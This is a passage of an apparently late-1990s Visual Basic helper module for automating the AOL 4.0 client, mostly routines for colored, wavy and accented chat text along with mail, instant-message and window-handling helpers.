thetree% = FindChildByClass(themail%, "_AOL_Tree")
Mail_Out_MailCount = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function

Function Mail_Out_PressEnter()
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
Mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
X = SendMessage(Mailtree%, WM_KEYDOWN, VK_RETURN, 0)
X = SendMessage(Mailtree%, WM_KEYUP, VK_RETURN, 0)
End Function


Function Mail_PressEnter()
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
Mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
X = SendMessage(Mailtree%, WM_KEYDOWN, VK_RETURN, 0)
X = SendMessage(Mailtree%, WM_KEYUP, VK_RETURN, 0)
End Function



Function Mail_SetCursor(mailIndex As String)
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
Mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
A6000% = SendMessageByString(Mailtree%, LB_SETCURSEL, mailIndex, 0)
End Function


Function Mail_MailCaption()
FindOpenMail
Mail_MailCaption = GetCaption(FindOpenMail)
End Function

Function SearchForSelected(Lst As ListBox)
If Lst.List(0) = "" Then
counterf = 0
GoTo last
End If
counterf = -1

Start:
counterf = counterf + 1
If Lst.ListCount = counterf + 1 Then GoTo last
If Lst.Selected(counterf) = True Then GoTo last
If couterf = Lst.ListCount Then GoTo last
GoTo Start

last:
SearchForSelected = counterf
End Function
Sub AOL4_SetFocus()
X = GetCaption(AOLWindow)
AppActivate X
End Sub
Function AOL4_UpChat()
'this is an upchat that minimizes the
'upload window
die% = FindWindow("_AOL_MODAL", vbNullString)
X = ShowWindow(die%, SW_HIDE)
X = ShowWindow(die%, SW_MINIMIZE)
Call AOL4_SetFocus
End Function
Sub NotOnTop(the As Form)
'This will take a form and make it so that
'it does not stay on top of other forms
'U HAVE TO MAKE THE EXE to SEE IT WERK

SetWinOnTop = SetWindowPos(the.hWnd, HWND_NOTOPMOST, 0, 0, 0, 0, flags)
End Sub
Sub AddRoomToComboBox(ListBox As ListBox, ComboBox As ComboBox)
Call AddRoomToListbox(ListBox)
For Q = 0 To ListBox.ListCount
    ComboBox.AddItem (ListBox.List(Q))
Next Q
End Sub

Function SendChat2(text)
SetFocusAPI (FindChatRoom)
AORich% = FindChildByClass(room%, "RICHCNTL")
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
Clipboard.Clear
Call SetFocusAPI(AORich%)
Call RunMenu(1, 5)
Call RunMenu(1, 2)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, text)
'DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
Call RunMenu(1, 4)
End Function

Sub StrikeOutSendChat(StrikeOutChat)
'This is a new sub that I thought of. It strikes
'the chat text out.
SendChat ("<S>" & StrikeOutChat & "</S>")
End Sub

Function wavetalker(strin2, f As ComboBox, c1 As ComboBox, c2 As ComboBox, c3 As ComboBox, c4 As ComboBox)
tixt = f
Color1 = c1
Color2 = c2
Color3 = c3
Color4 = c4
If Color1 = "Navy" Then Color1 = "000080"
If Color1 = "Maroon" Then Color1 = "800000"
If Color1 = "Lime" Then Color1 = "00FF00"
If Color1 = "Teal" Then Color1 = "008080"
If Color1 = "Red" Then Color1 = "F0000"
If Color1 = "Blue" Then Color1 = "0000FF"
If Color1 = "Siler" Then Color1 = "C0C0C0"
If Color1 = "Yellow" Then Color1 = "FFFF00"
If Color1 = "Aqua" Then Color1 = "00FFFF"
If Color1 = "Purple" Then Color1 = "800080"
If Color1 = "Black" Then Color1 = "000000"

If Color2 = "Navy" Then Color2 = "000080"
If Color2 = "Maroon" Then Color2 = "800000"
If Color2 = "Lime" Then Color2 = "00FF00"
If Color2 = "Teal" Then Color2 = "008080"
If Color2 = "Red" Then Color2 = "F0000"
If Color2 = "Blue" Then Color2 = "0000FF"
If Color2 = "Siler" Then Color2 = "C0C0C0"
If Color2 = "Yellow" Then Color2 = "FFFF00"
If Color2 = "Aqua" Then Color2 = "00FFFF"
If Color2 = "Purple" Then Color2 = "800080"
If Color1 = "Black" Then Color2 = "000000"

If Color3 = "Navy" Then Color3 = "000080"
If Color3 = "Maroon" Then Color3 = "800000"
If Color3 = "Lime" Then Color3 = "00FF00"
If Color3 = "Teal" Then Color3 = "008080"
If Color3 = "Red" Then Color3 = "F0000"
If Color3 = "Blue" Then Color3 = "0000FF"
If Color3 = "Siler" Then Color3 = "C0C0C0"
If Color3 = "Yellow" Then Color3 = "FFFF00"
If Color3 = "Aqua" Then Color3 = "00FFFF"
If Color3 = "Purple" Then Color3 = "800080"
If Color1 = "Black" Then Color3 = "000000"

If Color4 = "Navy" Then Color4 = "000080"
If Color4 = "Maroon" Then Color4 = "800000"
If Color4 = "Lime" Then Color4 = "00FF00"
If Color4 = "Teal" Then Color4 = "008080"
If Color4 = "Red" Then Color4 = "F0000"
If Color4 = "Blue" Then Color4 = "0000FF"
If Color4 = "Siler" Then Color4 = "C0C0C0"
If Color4 = "Yellow" Then Color4 = "FFFF00"
If Color4 = "Aqua" Then Color4 = "00FFFF"
If Color4 = "Purple" Then Color4 = "800080"
If Color1 = "Black" Then Color4 = "000000"

Let inptxt2$ = strin2
Let lenth2% = Len(inptxt2$)
mad = """"
Dad = "#"
Do While numspc2% <= lenth2%
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$
Loop
wavytalker = newsent2$
End Function

Sub UnderLineSendChat(UnderLineChat)
' underlines chat text.
SendChat ("<u>" & UnderLineChat & "</u>")
End Sub
Sub ItalicSendChat(ItalicChat)
'Makes chat text in Italics.
SendChat ("<i>" & ItalicChat & "</i>")
End Sub
Sub BoldSendChat(BoldChat)
'This is new it makes the chat text bold.
'example:
'BoldSendChat ("ThIs Is BoLd")
'It will come out bold on the chat screen.
SendChat ("<b>" & BoldChat & "</b>")
End Sub
Sub BoldWavyChatBlueBlack(thetext)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<B><FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#F0" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & T$
Next W
BoldSendChat (p$)
End Sub
Function BoldAOL4_WavColors2(Text1 As String)
G$ = Text1
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & ">" & T$
Next W
BoldSendChat (p$)
End Function
Sub BoldWavyColorbluegree(thetext)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & "></b>" & T$
Next W
BoldSendChat (p$)
End Sub
Sub BoldWavyColorredandblack(thetext)

G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "></b>" & T$
Next W
BoldSendChat (p$)
End Sub
Sub BoldWavyColorredandblue(thetext)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#ff0000" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "></b>" & T$
Next W
BoldSendChat (p$)
End Sub

Sub EliteTalker(Word$)
Made$ = ""
For Q = 1 To Len(Word$)
    letter$ = ""
    letter$ = Mid$(Word$, Q, 1)
    leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then leet$ = "â"
    If X = 2 Then leet$ = "å"
    If X = 3 Then leet$ = "ä"
    End If
    If letter$ = "b" Then leet$ = "b"
    If letter$ = "c" Then leet$ = "ç"
    If letter$ = "d" Then leet$ = "d"
    If letter$ = "e" Then
    If X = 1 Then leet$ = "ë"
    If X = 2 Then leet$ = "ê"
    If X = 3 Then leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then leet$ = "ì"
    If X = 2 Then leet$ = "ï"
    If X = 3 Then leet$ = "î"
    End If
    If letter$ = "j" Then leet$ = ",j"
    If letter$ = "n" Then leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then leet$ = "ô"
    If X = 2 Then leet$ = "ð"
    If X = 3 Then leet$ = "õ"
    End If
    If letter$ = "s" Then leet$ = "š"
    If letter$ = "t" Then leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then leet$ = "ù"
    If X = 2 Then leet$ = "û"
    If X = 3 Then leet$ = "ü"
    End If
    If letter$ = "w" Then leet$ = "vv"
    If letter$ = "y" Then leet$ = "ÿ"
    If letter$ = "0" Then leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then leet$ = "Å"
    If X = 2 Then leet$ = "Ä"
    If X = 3 Then leet$ = "Ã"
    End If
    If letter$ = "B" Then leet$ = "ß"
    If letter$ = "C" Then leet$ = "Ç"
    If letter$ = "D" Then leet$ = "Ð"
    If letter$ = "E" Then leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then leet$ = "Ï"
    If X = 2 Then leet$ = "Î"
    If X = 3 Then leet$ = "Í"
    End If
    If letter$ = "N" Then leet$ = "Ñ"
    If letter$ = "O" Then leet$ = "Õ"
    If letter$ = "S" Then leet$ = "Š"
    If letter$ = "U" Then leet$ = "Û"
    If letter$ = "W" Then leet$ = "VV"
    If letter$ = "Y" Then leet$ = "Ý"
    If letter$ = "`" Then leet$ = "´"
    If letter$ = "!" Then leet$ = "¡"
    If letter$ = "?" Then leet$ = "¿"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next Q
BoldSendChat (Made$)
End Sub









Sub Attention(thetext As String)

BoldSendChat ("$$$$$$$ ATTENTION $$$$$$$$")
Call TimeOut(0.15)
BoldSendChat (thetext)
Call TimeOut(0.15)
BoldSendChat ("$$$$$$$ ATTENTION $$$$$$$$")
Call TimeOut(0.15)
'BoldSendChat ("<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & "‹›·´¯`·._.·• " & G$ & "v¹·¹" & L$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • " & aa$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • ")
End Sub

Sub KillGlyph()
' Kills the annoying spinning AOL logo in the toobar
' on AOL 4.0
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
Glyph% = FindChildByClass(AOTool2%, "_AOL_Glyph")
Call SendMessage(Glyph%, WM_CLOSE, 0, 0)
End Sub





Function TrimTime()
b$ = Left$(Time$, 5)
HourH$ = Left$(b$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime = HourH$ & Right$(b$, 3) & " " & Ap$
End Function
Function TrimTime2()
b$ = Time$
HourH$ = Left$(b$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime2 = HourH$ & ":" & Right$(b$, 5) & " " & Ap$
End Function

Function EliteText(Word$)
Made$ = ""
For Q = 1 To Len(Word$)
    letter$ = ""
    letter$ = Mid$(Word$, Q, 1)
    leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then leet$ = "â"
    If X = 2 Then leet$ = "å"
    If X = 3 Then leet$ = "ä"
    End If
    If letter$ = "b" Then leet$ = "b"
    If letter$ = "c" Then leet$ = "ç"
    If letter$ = "e" Then
    If X = 1 Then leet$ = "ë"
    If X = 2 Then leet$ = "ê"
    If X = 3 Then leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then leet$ = "ì"
    If X = 2 Then leet$ = "ï"
    If X = 3 Then leet$ = "î"
    End If
    If letter$ = "j" Then leet$ = ",j"
    If letter$ = "n" Then leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then leet$ = "ô"
    If X = 2 Then leet$ = "ð"
    If X = 3 Then leet$ = "õ"
    End If
    If letter$ = "s" Then leet$ = "š"
    If letter$ = "t" Then leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then leet$ = "ù"
    If X = 2 Then leet$ = "û"
    If X = 3 Then leet$ = "ü"
    End If
    If letter$ = "w" Then leet$ = "vv"
    If letter$ = "y" Then leet$ = "ÿ"
    If letter$ = "0" Then leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then leet$ = "Å"
    If X = 2 Then leet$ = "Ä"
    If X = 3 Then leet$ = "Ã"
    End If
    If letter$ = "B" Then leet$ = "ß"
    If letter$ = "C" Then leet$ = "Ç"
    If letter$ = "D" Then leet$ = "Ð"
    If letter$ = "E" Then leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then leet$ = "Ï"
    If X = 2 Then leet$ = "Î"
    If X = 3 Then leet$ = "Í"
    End If
    If letter$ = "N" Then leet$ = "Ñ"
    If letter$ = "O" Then leet$ = "Õ"
    If letter$ = "S" Then leet$ = "Š"
    If letter$ = "U" Then leet$ = "Û"
    If letter$ = "W" Then leet$ = "VV"
    If letter$ = "Y" Then leet$ = "Ý"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next Q

EliteText = Made$

End Function



Function SNfromIM()

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient") '

im% = FindChildByTitle(MDI%, ">Instant Message From:")
If im% Then GoTo Greed
im% = FindChildByTitle(MDI%, "  Instant Message From:")
If im% Then GoTo Greed
Exit Function
Greed:
IMCap$ = GetCaption(im%)
theSN$ = Mid(IMCap$, InStr(IMCap$, ":") + 2)
SNfromIM = theSN$

End Function


Sub KillModal()
Modal% = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(Modal%, WM_CLOSE, 0, 0)
End Sub

Sub waitforok()
Do
DoEvents
okw = FindWindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If

DoEvents
Loop Until okw <> 0
   
    okb = FindChildByTitle(okw, "OK")
    okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)


End Sub

Function Black_LBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(f, f, f - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    Black_LBlue = Msg
End Function



Function YellowPinkYellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(78, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    YellowPink = Msg
End Function

Function WhitePurpleWhite(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    WhitePurpleWhite = Msg
End Function

Function LBlue_Green_LBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LBlue_Green_LBlue = Msg
End Function

Function LBlue_Yellow_LBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LBlue_Yellow_LBlue = Msg
End Function

Function Purple_LBlue_Purple()
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    Purple_LBlue = Msg
End Function

Function DBlue_Black_DBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 450 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    DBlue_Black_DBlue = Msg
End Function

Function DGreen_Black(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, f - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    DGreen_Black = Msg
End Function



Function LBlue_Orange(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255 - f, 155, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LBlue_Orange = Msg
End Function



Function LBlue_Orange_LBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 155, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LBlue_Orange_LBlue = Msg
End Function

Function LGreen_DGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 220 / A
        f = e * b
        G = RGB(0, 375 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LGreen_DGreen = Msg
End Function

Function LGreen_DGreen_LGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 490 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 375 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LGreen_DGreen_LGreen = Msg
End Function

Function LBlue_DBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(355, 255 - f, 55)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LBlue_DBlue = Msg
End Function

Function LBlue_DBlue_LBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(355, 255 - f, 55)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LBlue_DBlue_LBlue = Msg
End Function

Function PinkOrange(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 200 / A
        f = e * b
        G = RGB(255 - f, 167, 510)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    PinkOrange = Msg
End Function

Function PinkOrangePink(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 490 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 167, 510)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    PinkOrangePink = Msg
End Function

Function PurpleWhite(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 200 / A
        f = e * b
        G = RGB(255, f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    PurpleWhite = Msg
End Function

Function PurpleWhitePurple(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    PurpleWhitePurple = Msg
End Function
Function YellowBlack(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function YellowBlue(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function YellowGreen(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function YellowPurple(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function



Function YellowRedYellow(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function
Function YellowRed(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function
Function Yellow_LBlue_Yellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    Yellow_LBlue_Yellow = Msg
End Function
Sub BoldWavY(thetext)

G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<sup>" & r$ & "<B></sup>" & U$ & "<sub>" & S$ & "</sub>" & T$
Next W
BoldSendChat (p$)

End Sub

Sub CenterForm(f As Form)
f.Top = (Screen.Height * 0.85) / 2 - f.Height / 2
f.Left = Screen.Width / 2 - f.Width / 2
End Sub
Sub RespondIM(Message)
'This finds an IM sent to you, answers it with a
'message of "message", sends it and then closes the
'IM window
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")

im% = FindChildByTitle(MDI%, ">Instant Message From:")
If im% Then GoTo Greed
im% = FindChildByTitle(MDI%, "  Instant Message From:")
If im% Then GoTo Greed
Exit Sub
Greed:
e = FindChildByClass(im%, "RICHCNTL")

e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)

e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e2 = GetWindow(e, GW_HWNDNEXT) 'Send Text
e = GetWindow(e2, GW_HWNDNEXT) 'Send Button
Call SendMessageByString(e2, WM_SETTEXT, 0, Message)
ClickIcon (e)
Call TimeOut(0.8)
im% = FindChildByTitle(MDI%, "  Instant Message From:")
e = FindChildByClass(im%, "RICHCNTL")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
